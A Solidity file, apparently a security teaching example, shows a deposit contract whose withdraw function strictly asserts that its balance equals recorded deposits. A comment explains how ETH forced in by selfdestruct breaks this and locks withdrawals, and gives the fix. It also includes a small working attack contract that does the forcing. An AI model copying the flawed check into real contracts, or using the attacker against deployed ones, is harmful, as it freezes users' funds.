// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract SelfDestructMe {
    uint256 public totalDeposits;
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw() external {
        /*
            Apparently the only way to deposit ETH in the contract is via the `deposit` function.
            If that were the case, this strict equality would always hold.
            But anyone can deposit ETH via selfdestruct, or by setting this contract as the target
            of a beacon chain withdrawal.
            (see last paragraph of this section
            https://eth2book.info/capella/part2/deposits-withdrawals/withdrawal-processing/#performing-withdrawals),
            regardless of the contract not having a `receive` function.

            If anybody deposits ETH that way, then the equality breaks and the contract is DoS'd.
            To fix it, the code could be changed to >= instead of ==. Which means that the available
            ETH balance should be _at least_ `totalDeposits`, which makes more sense.
        */
        assert(address(this).balance == totalDeposits); // bad

        uint256 amount = deposits[msg.sender];
        totalDeposits -= amount;
        deposits[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }
}

contract AttackSelfDestructMe {
    SelfDestructMe target;

    constructor(SelfDestructMe _target) payable {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(payable(address(target)));
    }
}
